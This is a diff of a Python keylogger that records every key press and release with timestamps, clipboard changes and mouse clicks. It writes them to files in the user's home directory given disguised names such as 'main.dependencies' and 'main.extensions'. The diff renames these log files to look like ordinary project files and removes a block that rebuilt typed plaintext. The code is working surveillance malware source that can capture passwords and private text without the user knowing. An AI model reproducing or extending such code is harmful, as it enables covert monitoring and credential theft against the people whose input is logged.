@@ -32,11 +32,9 @@ controller = mouse.Controller()
 
 max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long
 clear_after_send = True
-settings_name = "Source/src.x"
+settings_name = "Source/main.dependencies"
 input_log_name = "Source/main.x"
-input_plaintext_name = "Source/main.dependencies.xd"
-input_plaintext_sep_name = "Source/src.dependencies.xd"
-clipboard_log_name = "Source/extensions.xe"
+clipboard_log_name = "Source/main.extensions"
 kill_switch_name = "Source/kill"
 clip = ""
 
@@ -220,6 +218,7 @@ def ascii_replace(key):
         return key
 
 def on_press(key):
+    # key press monitoring and logging
     key_name = ascii_replace(key)
 
     log = f" Pressed: {str(key_name).rjust(max_length)} | {datetime.now()}\n"
@@ -232,33 +231,10 @@ def on_press(key):
     else:
         with file_path.open('a') as file:
             file.write(log)
-    
-    try:
-        file_path = Path.home() / input_plaintext_name
-        file_path.parent.mkdir(parents=True, exist_ok=True)
-
-        if key_name == "backspace":
-            if file_path.exists():
-                with file_path.open('r') as file:
-                    text = file.readline()[:-1]
-                with file_path.open('w') as file:
-                    file.write(text)
-        else:
-            if key_name == "space":
-                log = " "
-            else:
-                log = key.char
-
-            if not file_path.exists():
-                file_path.write_text(log)
-            else:
-                with file_path.open('a') as file:
-                    file.write(log)
-    except:
-        pass
 
 def on_release(key):
     global clip
+    # Key release monitor and logging
     key_name = ascii_replace(key)
 
     log = f"Released: {str(key_name).rjust(max_length)} | {datetime.now()}\n"
@@ -274,6 +250,7 @@ def on_release(key):
             file.write(log)
             lines = len(file.readlines())
     
+    # clipboard monitor and logging
     try:
         if str(clip) != pyperclip.paste():
             clip = pyperclip.paste()
@@ -301,6 +278,7 @@ def on_release(key):
         return False
 
 def on_click(x, y, button, pressed):
+    # mouse click monitor and logging
     if pressed:
         coords = f"{x}, {y}"
         log = f"{ascii_replace(button).rjust(8)}: {str(coords).rjust(max_length)} | {datetime.now()}\n"
